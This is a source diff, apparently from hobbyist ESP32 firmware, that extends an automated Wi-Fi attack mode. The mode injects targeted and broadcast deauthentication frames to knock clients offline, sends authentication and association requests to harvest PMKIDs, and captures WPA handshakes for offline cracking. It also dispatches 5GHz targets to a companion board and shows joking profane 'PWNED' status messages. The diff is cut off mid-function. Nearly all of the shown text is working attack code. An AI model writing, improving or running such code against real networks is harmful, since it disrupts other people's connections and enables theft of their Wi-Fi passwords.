@@ -1,7 +1,8 @@
 // Oink Mode implementation
 
 #include "oink.h"
-#include "donoham.h"
+#include "oink_capture_filters.h"
+#include "do_no_ham.h"
 #include "warhog.h"
 #include "../core/porkchop.h"
 #include "../core/config.h"
@@ -16,7 +17,8 @@
 #include "../ui/display.h"
 #include "../piglet/mood.h"
 #include "../piglet/avatar.h"
-#include "../ui/swine_stats.h"
+#include "../audio/sfx.h"
+#include "../ui/flexes_screen.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include <NimBLEDevice.h>  // For BLE coexistence check
@@ -25,6 +27,7 @@
 #include <cstdarg>  // For va_list in deferred logging
 #include <esp_heap_caps.h>
 #include <atomic>  // For atomic beaconCaptured flag
+#include "../core/janus_hog.h"
 
 // NOTE: Vector mutex moved to NetworkRecon - use NetworkRecon::enterCritical()/exitCritical()
 // This ensures all modes (OINK, DoNoHam, Spectrum) use the SAME mutex for the shared networks vector
@@ -33,7 +36,12 @@
 // NOTE: oinkBusy is now SECONDARY protection - spinlock is PRIMARY
 // The promiscuous callback runs in WiFi task context (not true ISR), but still needs
 // synchronization to prevent race conditions on networks/handshakes vectors
-static volatile bool oinkBusy = false;
+static std::atomic<bool> oinkBusy{false};
+
+// Cache our current STA MAC so we can treat EAPOL frames destined for us as PMKID probe traffic.
+// Populated in OinkMode::start() after NetworkRecon has set up WiFi (and optional MAC randomization).
+static uint8_t ourStaMac[6] = {0};
+static bool ourStaMacValid = false;
 
 // Minimum free heap thresholds (centralized in HeapPolicy)
 static const size_t HANDSHAKE_ALLOC_MIN_BLOCK = sizeof(CapturedHandshake) + HeapPolicy::kHandshakeAllocSlack;
@@ -62,11 +70,24 @@ static volatile bool pendingAutoSave = false;  // Trigger autoSaveCheck from mai
 static volatile bool pendingPMKIDCapture = false;
 static char pendingPMKIDSSID[33] = {0};
 
+// Deferred EAPOL diagnostic log (callback sets, update() prints)
+static volatile uint8_t pendingEapolMsg = 0;  // 0 = none, 1-4 = M1-M4
+static uint8_t pendingEapolBssid[6] = {0};
+static uint8_t pendingEapolStation[6] = {0};
+static uint8_t pendingEapolFlags = 0;  // bit0: stationIsOurs
+
+// Visibility: handshake creation blocks (main thread only; printed rate-limited in update()).
+static uint32_t hsCreateBlockedCap = 0;
+static uint32_t hsCreateBlockedPressure = 0;
+static uint32_t hsCreateBlockedFree = 0;
+static uint32_t hsCreateBlockedFrag = 0;
+
 // Callback for NetworkRecon new network discovery -> XP events
 static void onNewNetworkDiscovered(wifi_auth_mode_t authmode, bool isHidden,
                                    const char* ssid, int8_t rssi, uint8_t channel) {
     // Skip weak networks — not actionable for attack modes
     if (rssi < Config::wifi().attackMinRssi) return;
+    Avatar::waveRipple(WaveMode::INCOMING);
     // Queue mood event for main thread (Mood::onNewNetwork triggers XP::addXP)
     if (!pendingNewNetwork) {
         if (ssid) {
@@ -218,6 +239,10 @@ static const uint16_t EAPOL_KEYDATA_OFFSET = 99;  // Key Data field offset
 
 // Timing constants
 static const uint32_t DEAUTH_BURST_INTERVAL_MS = 180;  // Optimal deauth burst interval (prevents queue saturation)
+static const uint32_t DEAUTH_POST_M1_LISTEN_MS = 1200; // Pause deauth briefly after M1 to capture handshake
+
+// Callback (WiFi task) sets this when target M1 is observed; main loop reads it.
+static std::atomic<uint32_t> deauthPauseUntilMs{0};
 
 // Beacon frame storage for PCAP (required for hashcat)
 static uint8_t beaconFrameStorage[MAX_BEACON_SIZE] = {0};
@@ -238,6 +263,29 @@ uint8_t currentHopIndex = 0;
 // Deauth timing
 static uint32_t lastDeauthTime = 0;
 static uint32_t lastMoodUpdate = 0;
+
+// Non-blocking deauth burst state machine (Change 1 + Change 6)
+// Replaces blocking sendDeauthBurst loop with cooperative scheduling.
+// Phase 0 = initial knock (2 fast frames <5ms), Phase 1 = maintenance drip (1 per 250ms)
+struct DeauthBurstState {
+    uint8_t targetBssid[6];
+    uint8_t clientMac[6];
+    uint8_t frameCount;       // Total frames remaining in current phase
+    uint8_t phase;            // 0=knock, 1=maintenance
+    uint8_t direction;        // 0=AP->client, 1=client->AP
+    uint8_t clientIndex;      // Which client we're deauthing (for multi-client)
+    uint8_t clientTotal;      // Total clients to cycle through
+    uint8_t clientMacs[MAX_CLIENTS_PER_NETWORK][6]; // Snapshot of all client MACs
+    uint32_t nextSendTime;    // millis() when next frame should be sent
+    bool active;              // Burst in progress
+};
+static DeauthBurstState deauthBurst = {};
+static const uint32_t DEAUTH_KNOCK_INTERVAL_MS = 3;    // Fast knock: ~3ms between frames
+static const uint32_t DEAUTH_MAINTENANCE_MS = 250;      // Maintenance drip: 1 frame per 250ms
+
+// Handshake completion flag - O(1) check replaces O(H*N) vector scan (Change 9)
+static volatile bool handshakeJustCompleted = false;
+static uint8_t justCompletedBssid[6] = {0};
 
 // Random hunting sniff - periodic sniff to show piglet is actively hunting
 static uint32_t lastRandomSniff = 0;
@@ -271,7 +319,7 @@ static AutoState autoState = AutoState::SCANNING;
 static uint32_t stateStartTime = 0;
 static uint32_t attackStartTime = 0;
 static const uint32_t SCAN_TIME = 5000;         // 5 sec initial scan
-// LOCK_TIME now uses SwineStats::getLockTime() for class buff support
+// LOCK_TIME now uses FlexesScreen::getLockTime() for class buff support
 static const uint32_t ATTACK_TIMEOUT = 15000;   // 15 sec per target
 static const uint32_t WAIT_TIME = 4500;         // 4.5 sec between targets (allows late EAPOL M3/M4)
 static const uint32_t BORED_RETRY_TIME = 30000; // 30 sec between retry scans when bored
@@ -317,6 +365,14 @@ static bool hasPendingHandshake = false;
 // Reset bored state on init
 static bool boredStateReset = true;  // Flag to reset on start()
 
+// Background C5 5GHz attack (runs independently of autoState - JANUS HOG)
+// Fire-and-forget: dispatch to C5, continue 2.4GHz hunting while it works
+static bool c5BackgroundActive = false;
+static uint8_t c5BackgroundBssid[6] = {0};
+static char c5BackgroundSSID[33] = {0};
+static uint32_t c5BackgroundStartTime = 0;
+static const uint32_t C5_BACKGROUND_TIMEOUT = 45000;  // 45s max per 5GHz target
+
 // Last pwned network SSID for display
 static char lastPwnedSSID[33] = "";
 
@@ -341,6 +397,7 @@ void OinkMode::init() {
     pendingDeauthSuccess = false;
     pendingHandshakeComplete = false;
     pendingPMKIDCapture = false;
+    pendingEapolMsg = 0;
     
     // Reset bored state tracking
     consecutiveFailedScans = 0;
@@ -385,6 +442,7 @@ void OinkMode::init() {
     packetCount.store(0, std::memory_order_relaxed);
     deauthCount = 0;
     currentHopIndex = 0;
+    deauthPauseUntilMs.store(0, std::memory_order_relaxed);
     
     // Reset state machine
     autoState = AutoState::SCANNING;
@@ -396,7 +454,20 @@ void OinkMode::init() {
     lastRandomSniff = 0;
     checkedForPendingHandshake = false;
     hasPendingHandshake = false;
-    
+
+    // Reset non-blocking deauth burst state
+    deauthBurst.active = false;
+    memset(&deauthBurst, 0, sizeof(deauthBurst));
+
+    // Reset handshake completion flag
+    handshakeJustCompleted = false;
+    memset(justCompletedBssid, 0, 6);
+
+    // Reset background C5 attack state
+    c5BackgroundActive = false;
+    memset(c5BackgroundBssid, 0, 6);
+    c5BackgroundSSID[0] = '\0';
+
     // Clear beacon frame (static storage, no free)
     beaconFrame = beaconFrameStorage;
     beaconFrameLen = 0;
@@ -419,6 +490,24 @@ void OinkMode::start() {
     
     // Initialize WSL bypasser for deauth frame injection
     WSLBypasser::init();
+
+    // Cache our STA MAC so we can filter probe-induced EAPOL traffic (station == our MAC).
+    // IMPORTANT: NetworkRecon may randomize the STA MAC on start(), so read it after ensuring recon is running.
+    esp_err_t macErr = esp_wifi_get_mac(WIFI_IF_STA, ourStaMac);
+    ourStaMacValid = (macErr == ESP_OK);
+    if (!ourStaMacValid) {
+        memset(ourStaMac, 0, sizeof(ourStaMac));
+        Serial.printf("[OINK] STA MAC read failed (%d); probe filtering disabled\n", (int)macErr);
+    } else {
+        Serial.printf("[OINK] STA MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                      ourStaMac[0], ourStaMac[1], ourStaMac[2], ourStaMac[3], ourStaMac[4], ourStaMac[5]);
+    }
+
+    // Reset visibility counters for this run
+    hsCreateBlockedCap = 0;
+    hsCreateBlockedPressure = 0;
+    hsCreateBlockedFree = 0;
+    hsCreateBlockedFrag = 0;
     
     // Register our packet callback for EAPOL/handshake capture
     NetworkRecon::setPacketCallback(promiscuousCallback);
@@ -456,10 +545,16 @@ void OinkMode::stop() {
     
     deauthing = false;
     scanning = false;
-    
-    // Stop grass animation
+    deauthBurst.active = false;  // Clear any in-progress burst
+
+    // Clear scanning dwell override
+    NetworkRecon::setHopIntervalOverride(0);
+
+    // Stop grass animation, tree, and wave ripples
     Avatar::setGrassMoving(false);
-    
+    Avatar::hideTree();
+    Avatar::waveRipple(WaveMode::NONE);
+
     // Clear our callbacks (NetworkRecon keeps running)
     NetworkRecon::setPacketCallback(nullptr);
     NetworkRecon::setNewNetworkCallback(nullptr);
@@ -472,11 +567,18 @@ void OinkMode::stop() {
     // Process any deferred XP saves
     XP::processPendingSave();
     
+    // Cancel any in-progress C5 5GHz background attack
+    if (c5BackgroundActive) {
+        JanusHog::requestStop();
+        JanusHog::clearHandshakeResult();
+        c5BackgroundActive = false;
+    }
+    clearTarget();
+
     // Reset beacon frame (static storage, no free)
     beaconFrame = beaconFrameStorage;
     beaconFrameLen = 0;
     beaconCaptured = false;
-    clearTargetClients();
     
     // Free per-handshake beacon memory to prevent leaks on repeated start/stop
     for (auto& hs : handshakes) {
@@ -536,6 +638,19 @@ void OinkMode::update() {
         lastHeapLog = now;
     }
     // #endregion
+
+    // Rate-limited visibility: handshake/PMKID pool and handshake-create block reasons.
+    static uint32_t lastStatsLog = 0;
+    if (now - lastStatsLog >= 5000) {
+        Serial.printf("[OINK-STATS] hs=%u/%u pmkids=%u/%u hsBlk{cap=%u pressure=%u free=%u frag=%u}\n",
+                      (unsigned)handshakes.size(), (unsigned)handshakes.capacity(),
+                      (unsigned)pmkids.size(), (unsigned)pmkids.capacity(),
+                      (unsigned)hsCreateBlockedCap,
+                      (unsigned)hsCreateBlockedPressure,
+                      (unsigned)hsCreateBlockedFree,
+                      (unsigned)hsCreateBlockedFrag);
+        lastStatsLog = now;
+    }
     
     // Guard access to networks/handshakes vectors from promiscuous callback
     // NOTE: oinkBusy is secondary protection, spinlock is primary
@@ -578,6 +693,18 @@ void OinkMode::update() {
     NetworkRecon::exitCritical();
     if (hasPendingDeauth) {
         Mood::onDeauthSuccess(pendingStationCopy);
+        Avatar::dropFruit();
+        // M1 observed for target: stop active jamming and switch to listen phase.
+        // Continuing deauth here can suppress M2/M3 and cause handshake miss.
+        if (autoState == AutoState::ATTACKING) {
+            deauthBurst.active = false;  // Immediately clear non-blocking burst
+            autoState = AutoState::WAITING;
+            stateStartTime = now;
+            deauthing = false;
+            deauthPauseUntilMs.store(0, std::memory_order_relaxed);
+            checkedForPendingHandshake = false;
+            hasPendingHandshake = false;
+        }
     }
     
     // Process pending mood: handshake complete
@@ -620,6 +747,22 @@ void OinkMode::update() {
         pendingAutoSave = true;
     }
     
+    // Diagnostic: EAPOL frame received (deferred from callback)
+    uint8_t eapolMsg = pendingEapolMsg;  // volatile read
+    if (eapolMsg) {
+        uint8_t bssidCopy[6];
+        uint8_t stationCopy[6];
+        uint8_t flagsCopy = pendingEapolFlags;
+        memcpy(bssidCopy, pendingEapolBssid, 6);
+        memcpy(stationCopy, pendingEapolStation, 6);
+        pendingEapolMsg = 0;
+        Serial.printf("[OINK] EAPOL M%d b=%02X:%02X:%02X:%02X:%02X:%02X s=%02X:%02X:%02X:%02X:%02X:%02X%s\n",
+                      eapolMsg,
+                      bssidCopy[0], bssidCopy[1], bssidCopy[2], bssidCopy[3], bssidCopy[4], bssidCopy[5],
+                      stationCopy[0], stationCopy[1], stationCopy[2], stationCopy[3], stationCopy[4], stationCopy[5],
+                      (flagsCopy & 0x01) ? " (to-us)" : "");
+    }
+
     // Process pending auto-save (callback set flag, we do SD I/O here)
     bool shouldAutoSave = false;
     NetworkRecon::enterCritical();
@@ -628,16 +771,22 @@ void OinkMode::update() {
         shouldAutoSave = true;
     }
     NetworkRecon::exitCritical();
-    if (shouldAutoSave) {
-        autoSaveCheck();
-    }
+    // IMPORTANT: don't run autoSaveCheck() while oinkBusy is true.
+    // autoSaveCheck pauses promiscuous mode and does SD I/O, which can drop EAPOL frames.
     
     // Process pending handshake creation from circular buffer (callback queued, we do push_back here)
     while (pendingHsRead != pendingHsWrite) {
         // Get slot from circular buffer
         uint8_t slot = pendingHsRead;
-        if (pendingHsBusy[slot] || !pendingHandshakes[slot]) {
-            break;  // Slot still being written by callback or not allocated, wait for next cycle
+        if (!pendingHandshakes[slot]) {
+            break;  // Not allocated yet, wait for next cycle
+        }
+        // CAS acquire: atomically set busy=true if currently false.
+        // Prevents concurrent access if the WiFi callback (core 1)
+        // is updating this slot's frame data at the same time.
+        bool expected = false;
+        if (!pendingHsBusy[slot].compare_exchange_strong(expected, true)) {
+            break;  // Callback is writing to this slot, wait for next cycle
         }
         
         // Create or find handshake entry in main thread context
@@ -688,9 +837,13 @@ void OinkMode::update() {
                 strncpy(pendingHandshakeSSID, hs.ssid, 32);
                 pendingHandshakeSSID[32] = 0;
                 WarhogMode::markCaptured(hs.bssid);
-                
-                // Auto-save complete handshake (safe here - main thread context)
-                autoSaveCheck();
+
+                // Change 9: Set O(1) completion flag
+                memcpy(justCompletedBssid, hs.bssid, 6);
+                handshakeJustCompleted = true;
+
+                // Defer auto-save until we're outside capture-critical states.
+                pendingAutoSave = true;
             }
             
             // Handle PMKID from M1 if present
@@ -710,10 +863,13 @@ void OinkMode::update() {
             }
         }
         
-        // Release slot back to static pool (no heap ops), advance read pointer
+        // Release slot back to static pool (no heap ops), advance read pointer.
+        // Clear pointer and allocated BEFORE releasing busy — ensures producer
+        // won't see this slot as a valid existing entry during its BSSID scan.
         pendingHandshakes[slot] = nullptr;
         pendingHsAllocated[slot] = false;
         pendingHsRead = (pendingHsRead + 1) % PENDING_HS_SLOTS;
+        pendingHsBusy[slot].store(false);  // Release CAS lock
     }
     
     // Process pending PMKID creation (callback queued, we do push_back here)
@@ -765,12 +921,100 @@ void OinkMode::update() {
     
     // Sync grass animation with channel hopping state
     Avatar::setGrassMoving(channelHopping);
-    
+
+    // Sync fruit tree with attack state
+    {
+        bool wantTree = (autoState == AutoState::LOCKING ||
+                         autoState == AutoState::ATTACKING ||
+                         autoState == AutoState::WAITING);
+        static bool hadTree = false;
+
+        if (wantTree && !hadTree) {
+            // Count attackable networks with clients on current channel
+            uint8_t fruits = 0;
+            uint8_t ch = NetworkRecon::getCurrentChannel();
+            NetworkRecon::enterCritical();
+            for (size_t i = 0; i < networks().size() && fruits < 8; i++) {
+                const auto& n = networks()[i];
+                if (n.channel != ch) continue;
+                if (n.authmode == WIFI_AUTH_OPEN || n.isHidden) continue;
+                if (NetworkRecon::estimateClientCount(n) > 0) fruits++;
+            }
+            NetworkRecon::exitCritical();
+            if (fruits > 0) Avatar::showTree(fruits);
+        } else if (!wantTree && hadTree) {
+            Avatar::hideTree();
+        }
+        hadTree = wantTree;
+    }
+
+    // === Background C5 5GHz polling (independent of autoState) ===
+    // Runs every update() regardless of what the 2.4GHz state machine is doing
+    static const char* c5DispatchPhrases[] = {
+        "AVADA KEDAWRA KURRRWA", "EXPECTO PAKIETUM", "CRUCIO 5GHZ",
+        "WINGARDIUM DEAUTHOSA", "SECTUMSEMPRA 5G", "DZIK JEDZIE NA 5G",
+        "IGNI KURWA IGNI", "KIELBASA INBOUND", "5G WPIERDOL BRUV",
+        "O KURWA DUAL BAND"
+    };
+    static const char* c5CapturePhrases[] = {
+        "5G PWNED KURWA MAC", "DZIK ZJADL TRUFEL", "BIGOS Z 5GHZ",
+        "KURWA TO DZIALA", "5G KIELBASA PODANA", "PROTEGO THIS KURWA"
+    };
+    static const char* c5FailPhrases[] = {
+        "CHOLERA 5G FIZZLED", "DZIK MISSED KURWA", "5G DUPA",
+        "FINITE INCANTATEM KURWA"
+    };
+    static const char* c5TimeoutPhrases[] = {
+        "5G KURWA TIMEOUT", "C5 PIERDOLI SIE", "DZIK ZASNAL NA 5G"
+    };
+
+    if (c5BackgroundActive) {
+        HandshakeResult hr = JanusHog::getHandshakeResult();
+        if (hr == HandshakeResult::CAPTURED) {
+            JanusHog::clearHandshakeResult();
+            Serial.println("[OINK] 5GHz handshake captured via C5 (background)");
+            NetworkRecon::enterCritical();
+            for (auto& net : networks()) {
+                if (memcmp(net.bssid, c5BackgroundBssid, 6) == 0) {
+                    net.hasHandshake = true;
+                    break;
+                }
+            }
+            NetworkRecon::exitCritical();
+            WarhogMode::markCaptured(c5BackgroundBssid);
+            strncpy(lastPwnedSSID, c5BackgroundSSID[0] ? c5BackgroundSSID : "5GHz TARGET", sizeof(lastPwnedSSID) - 1);
+            lastPwnedSSID[sizeof(lastPwnedSSID) - 1] = '\0';
+            Mood::onHandshakeCaptured(lastPwnedSSID);
+            Mood::setStatusMessage(c5CapturePhrases[random(0, 6)]);
+            Display::showLoot(lastPwnedSSID);
+            c5BackgroundActive = false;
+        } else if (hr == HandshakeResult::FAILED) {
+            JanusHog::clearHandshakeResult();
+            Serial.println("[OINK] 5GHz C5 attack failed (background)");
+            Mood::setStatusMessage(c5FailPhrases[random(0, 4)]);
+            c5BackgroundActive = false;
+        } else if (!JanusHog::isConnected()) {
+            JanusHog::clearHandshakeResult();
+            Serial.println("[OINK] C5 disconnected during background attack");
+            c5BackgroundActive = false;
+        } else if (now - c5BackgroundStartTime > C5_BACKGROUND_TIMEOUT) {
+            JanusHog::requestStop();
+            JanusHog::clearHandshakeResult();
+            Serial.println("[OINK] 5GHz C5 background attack timeout");
+            Mood::setStatusMessage(c5TimeoutPhrases[random(0, 3)]);
+            c5BackgroundActive = false;
+        }
+    }
+
     // Auto-attack state machine (like M5Gotchi)
     switch (autoState) {
         case AutoState::SCANNING:
             {
-                uint16_t hopInterval = SwineStats::getChannelHopInterval();
+                // Change 8: Longer dwell time during scanning increases beacon/data capture
+                // 250ms ≈ 2.5 beacon intervals, 67% more capture probability than default 150ms
+                NetworkRecon::setHopIntervalOverride(250);
+
+                uint16_t hopInterval = FlexesScreen::getChannelHopInterval();
                 
                 // Channel hopping during scan (buff-modified interval)
                 if (now - lastHopTime > hopInterval) {
@@ -795,6 +1039,7 @@ void OinkMode::update() {
                 
                 // After scan time, sort and enter PMKID hunting
                 if (now - stateStartTime > SCAN_TIME) {
+                    NetworkRecon::setHopIntervalOverride(0);  // Clear scanning dwell override
                     if (!networks().empty()) {
                         sortNetworksByPriority();
                         autoState = AutoState::PMKID_HUNTING;
@@ -824,9 +1069,14 @@ void OinkMode::update() {
         case AutoState::PMKID_HUNTING:
             {
                 uint32_t huntElapsed = now - stateStartTime;
-                
-                // Timeout: 30s hunt window
-                if (huntElapsed > PMKID_HUNT_MAX) {
+
+                // Change 5: Dynamic PMKID cap — scales with network count, caps at 10s for <=25 networks
+                uint16_t netCount = NetworkRecon::getNetworkCount();
+                uint32_t pmkidCap = (netCount > 0)
+                    ? min((uint32_t)PMKID_HUNT_MAX, max((uint32_t)10000, (uint32_t)netCount * 400))
+                    : 10000;
+
+                if (huntElapsed > pmkidCap) {
                     autoState = AutoState::NEXT_TARGET;
                     stateStartTime = now;
                     Mood::setStatusMessage("weapons hot");
@@ -880,10 +1130,15 @@ void OinkMode::update() {
                     oinkBusy = wasBusy;
                     
                     if (foundTarget) {
-                        if (currentChannel != targetChannel) {
-                            setChannel(targetChannel);
-                        }
+                        // Always lock channel for PMKID probe (even if already on it)
+                        // Without lock, NetworkRecon can hop away before AP's M1 response
+                        setChannel(targetChannel);
+                        // IEEE 802.11 state machine: Auth must precede Assoc
+                        // Most APs silently drop Assoc from unauthenticated STAs
+                        sendAuthenticationRequest(targetBssid);
+                        delay(10);  // AP processes auth in <2ms; 10ms is safe margin
                         sendAssociationRequest(targetBssid, targetSSID, strlen(targetSSID));
+                        Avatar::waveRipple(WaveMode::OUTGOING);
                         pmkidProbeTime = now;
                         if (pmkidTargetIndex < 64) pmkidProbedBitset |= (1ULL << pmkidTargetIndex);
                         Avatar::sniff();
@@ -902,10 +1157,10 @@ void OinkMode::update() {
             {
                 // Use smart target selection
                 int nextIdx = getNextTarget();
-                
+
                 if (nextIdx < 0) {
                     consecutiveFailedScans++;
-                    
+
                     if (consecutiveFailedScans >= BORED_THRESHOLD) {
                         // Pig is bored - no targets for too long
                         autoState = AutoState::BORED;
@@ -923,10 +1178,10 @@ void OinkMode::update() {
                     }
                     break;
                 }
-                
+
                 // Found a target - reset failed scan counter
                 consecutiveFailedScans = 0;
-                
+
                 // Revalidate: Network might have been removed between getNextTarget() and here
                 if (nextIdx >= (int)networks().size()) {
                     autoState = AutoState::SCANNING;
@@ -934,23 +1189,64 @@ void OinkMode::update() {
                     channelHopping = true;
                     break;
                 }
-                
+
+                // === 5GHz target: fire-and-forget to C5, don't block state machine ===
+                bool targetIs5g = false;
+                NetworkRecon::enterCritical();
+                if (nextIdx < (int)networks().size()) {
+                    targetIs5g = networks()[nextIdx].is5GHz();
+                }
+                NetworkRecon::exitCritical();
+
+                if (targetIs5g) {
+                    // Snapshot target info and dispatch to C5 background
+                     NetworkRecon::enterCritical();
+                     if (nextIdx < (int)networks().size()) {
+                         memcpy(c5BackgroundBssid, networks()[nextIdx].bssid, 6);
+                         strncpy(c5BackgroundSSID, networks()[nextIdx].ssid, 32);
+                         c5BackgroundSSID[32] = '\0';
+                     }
+                     NetworkRecon::exitCritical();
+
+                     if (JanusHog::isReady() && JanusHog::requestHandshake(c5BackgroundBssid)) {
+                         // Only count an "attempt" if the dispatch actually started.
+                         // (C5 can be connected but busy with scan/import, in which case requestHandshake won't run.)
+                         NetworkRecon::enterCritical();
+                         for (auto& net : networks()) {
+                             if (memcmp(net.bssid, c5BackgroundBssid, 6) == 0) {
+                                 net.attackAttempts++;
+                                 break;
+                             }
+                         }
+                         NetworkRecon::exitCritical();
+
+                         c5BackgroundActive = true;
+                         c5BackgroundStartTime = now;
+                         Serial.printf("[OINK] 5GHz dispatched to C5 bg: %s\n", c5BackgroundSSID);
+                         Mood::setStatusMessage(c5DispatchPhrases[random(0, 10)]);
+                     }
+                    // Don't enter LOCKING — loop back to find a 2.4GHz target.
+                    // Next getNextTarget() skips 5GHz while c5BackgroundActive.
+                    break;
+                }
+
+                // === 2.4GHz target: normal state machine path ===
                 selectionIndex = nextIdx;
-                
+
                 // Select this target (locks to channel, stops hopping)
                 selectTarget(selectionIndex);
                 networks()[selectionIndex].attackAttempts++;
-                
+
                 // Go to LOCKING state to discover clients before attacking
                 autoState = AutoState::LOCKING;
                 stateStartTime = now;
                 deauthing = false;  // Don't deauth yet, just listen
                 channelHopping = false;  // Ensure channel stays locked during capture phase
-                
+
                 // #region agent log - H1/H2 state transition to LOCKING
                 Serial.printf("[DBG-H1H2] ->LOCKING target=%s ch=%d PMF=%d reconLocked=%d\n", networks()[selectionIndex].ssid, networks()[selectionIndex].channel, networks()[selectionIndex].hasPMF ? 1 : 0, NetworkRecon::isChannelLocked() ? 1 : 0);
                 // #endregion
-                
+
                 Mood::setStatusMessage("sniffin clients");
                 Avatar::sniff();  // Nose twitch when sniffing for auths
             }
@@ -1010,7 +1306,21 @@ void OinkMode::update() {
                 bool hasRecentClient = (targetCopy.lastDataSeen > 0) &&
                     (now - targetCopy.lastDataSeen) <= CLIENT_RECENT_MS;
 
-                if (!hasRecentClient && lockElapsed >= LOCK_EARLY_EXIT_MS) {
+                // Change 4: At 2s into LOCKING with no clients, send ONE broadcast deauth
+                // to provoke reassociation traffic that reveals clients via data frames
+                {
+                    static bool lockProbeDeauthSent = false;
+                    if (lockElapsed < 500) lockProbeDeauthSent = false;  // Reset on new lock
+                    if (!lockProbeDeauthSent && !hasRecentClient && lockElapsed >= 2000) {
+                        uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                        sendDeauthFrame(targetCopy.bssid, broadcast, 7);
+                        lockProbeDeauthSent = true;
+                    }
+                }
+
+                // Change 4: First attempt gets 6s LOCKING, retries get 4s (already know client landscape)
+                uint32_t earlyExitMs = (targetCopy.attackAttempts == 0) ? 6000 : LOCK_EARLY_EXIT_MS;
+                if (!hasRecentClient && lockElapsed >= earlyExitMs) {
                     autoState = AutoState::NEXT_TARGET;
                     stateStartTime = now;
                     deauthing = false;
@@ -1029,7 +1339,7 @@ void OinkMode::update() {
                     break;
                 }
 
-                if (lockElapsed > SwineStats::getLockTime()) {
+                if (lockElapsed > FlexesScreen::getLockTime()) {
                     autoState = AutoState::ATTACKING;
                     attackStartTime = now;
                     deauthCount = 0;
@@ -1044,6 +1354,9 @@ void OinkMode::update() {
             
         case AutoState::ATTACKING:
             {
+                // 5GHz targets are handled by background C5 polling above —
+                // this state only handles 2.4GHz local deauth + capture.
+
                 // Snapshot target data to avoid races with callback updates
                 bool targetFound = false;
                 uint8_t targetBssidLocal[6] = {0};
@@ -1052,8 +1365,8 @@ void OinkMode::update() {
                 uint8_t clientCountLocal = 0;
                 uint8_t clientMacs[MAX_CLIENTS_PER_NETWORK][6] = {};
 
-                const bool wasBusy = oinkBusy;
-                oinkBusy = true;
+                const bool wasBusy = oinkBusy.load(std::memory_order_relaxed);
+                oinkBusy.store(true, std::memory_order_relaxed);
                 NetworkRecon::enterCritical();
                 for (int i = 0; i < (int)networks().size(); i++) {
                     if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
@@ -1066,8 +1379,8 @@ void OinkMode::update() {
                         break;
                     }
                 }
-                NetworkRecon::exitCritical();
 
+                // Snapshot client list under same spinlock (protects against trackTargetClient on core 1)
                 if (targetFound) {
                     clientCountLocal = targetClientCount;
                     if (clientCountLocal > MAX_CLIENTS_PER_NETWORK) {
@@ -1077,8 +1390,8 @@ void OinkMode::update() {
                         memcpy(clientMacs[c], targetClients[c].mac, 6);
                     }
                 }
-
-                oinkBusy = wasBusy;
+                NetworkRecon::exitCritical();
+                oinkBusy.store(wasBusy, std::memory_order_relaxed);
 
                 if (!targetFound) {
                     autoState = AutoState::NEXT_TARGET;
@@ -1091,50 +1404,144 @@ void OinkMode::update() {
                     break;
                 }
 
-                // Send deauth burst every 180ms (optimal rate per research - prevents queue saturation)
-                if (now - lastDeauthTime > 180) {
+                uint32_t pauseUntil = deauthPauseUntilMs.load(std::memory_order_relaxed);
+                bool listenWindowActive = (pauseUntil != 0) && ((int32_t)(pauseUntil - now) > 0);
+
+                // Change 3: Adaptive listen window - extend pause based on capture state
+                if (listenWindowActive) {
+                    // Check what we have so far for this target
+                    bool hasM1Only = false;
+                    bool hasM1M2 = false;
+                    for (const auto& hs : handshakes) {
+                        if (memcmp(hs.bssid, targetBssidLocal, 6) == 0) {
+                            if (hs.hasM1() && !hs.hasM2()) hasM1Only = true;
+                            if (hs.hasM1() && hs.hasM2()) hasM1M2 = true;
+                            break;
+                        }
+                    }
+                    // M1 only after initial window: extend to 2500ms (slow IoT clients)
+                    if (hasM1Only && (int32_t)(pauseUntil - now) < 200) {
+                        deauthPauseUntilMs.store(now + 2500, std::memory_order_relaxed);
+                    }
+                    // M1+M2 captured: keep listening 500ms more for M3/M4 bonus
+                    if (hasM1M2 && (int32_t)(pauseUntil - now) < 100) {
+                        deauthPauseUntilMs.store(now + 500, std::memory_order_relaxed);
+                    }
+                }
+
+                // M1 detected: immediately clear any in-progress deauth burst
+                if (listenWindowActive && deauthBurst.active) {
+                    deauthBurst.active = false;
+                }
+
+                // Non-blocking deauth: process ONE frame per update() call (Change 1 + Change 6)
+                if (!listenWindowActive) {
                     // Skip if PMF (shouldn't happen but safety check)
                     if (targetHasPMF) {
                         selectionIndex++;
                         autoState = AutoState::NEXT_TARGET;
+                        deauthBurst.active = false;
                         break;
                     }
-                    
-                    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-                    
-                    // PRIORITY 1: Target specific clients (MOST EFFECTIVE)
-                    // Targeted deauth is much more reliable than broadcast
-                    if (clientCountLocal > 0) {
-                        // Get buff-modified burst count (base 5, buffed up to 8, debuffed down to 3)
-                        uint8_t burstCount = SwineStats::getDeauthBurstCount();
-                        // #region agent log - H6 deauth send
+
+                    // Process active burst: send one frame when timer expires
+                    if (deauthBurst.active && now >= deauthBurst.nextSendTime) {
+                        uint8_t ci = deauthBurst.clientIndex;
+                        if (deauthBurst.direction == 0) {
+                            // AP -> Client
+                            sendDeauthFrame(deauthBurst.targetBssid, deauthBurst.clientMacs[ci], 7);
+                            deauthBurst.direction = 1;
+                            uint8_t jitterMax = FlexesScreen::getDeauthJitterMax();
+                            deauthBurst.nextSendTime = now + random(1, jitterMax + 1);
+                        } else {
+                            // Client -> AP (reverse)
+                            uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                            if (memcmp(deauthBurst.clientMacs[ci], broadcast, 6) != 0) {
+                                sendDeauthFrame(deauthBurst.clientMacs[ci], deauthBurst.targetBssid, 1);
+                            }
+                            deauthBurst.direction = 0;
+                            deauthBurst.frameCount--;
+                            deauthCount++;
+
+                            if (deauthBurst.frameCount == 0) {
+                                // Move to next client or switch to maintenance phase
+                                deauthBurst.clientIndex++;
+                                if (deauthBurst.clientIndex < deauthBurst.clientTotal) {
+                                    // Next client: restart knock phase
+                                    deauthBurst.frameCount = 2;
+                                    deauthBurst.phase = 0;
+                                    deauthBurst.direction = 0;
+                                    deauthBurst.nextSendTime = now + DEAUTH_KNOCK_INTERVAL_MS;
+                                } else if (deauthBurst.phase == 0) {
+                                    // All clients knocked, switch to maintenance drip
+                                    deauthBurst.phase = 1;
+                                    deauthBurst.clientIndex = 0;
